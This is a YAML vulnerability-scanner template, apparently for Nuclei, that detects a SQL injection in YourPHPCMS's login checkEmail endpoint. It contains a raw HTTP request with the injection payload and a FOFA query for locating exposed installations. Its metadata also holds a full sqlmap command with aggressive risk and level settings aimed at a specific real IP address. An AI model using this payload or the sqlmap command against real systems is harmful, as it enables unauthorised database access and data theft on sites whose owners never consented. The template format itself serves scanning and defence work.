id: yourphpcms-email-login-sqli
info:
  name: YourPHPCMS email Login - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/main/YourPHPCMS/YourPHPCMS%E7%B3%BB%E7%BB%9Flogin_checkEmail%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: header="YP_onlineid"
    sqlmap: sqlmap -u "http://47.92.170.135/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-69710348@nwcrb.com" --tamper=space2comment --dbms=mysql --risk 3 --level 5 -p email
  tags: sqli,cms,yourphpcms

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
      
      - |+
        GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate, br, zstd 
  
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(header_1,'YP_onlineid')
          - contains(body_2,'true')
        condition: and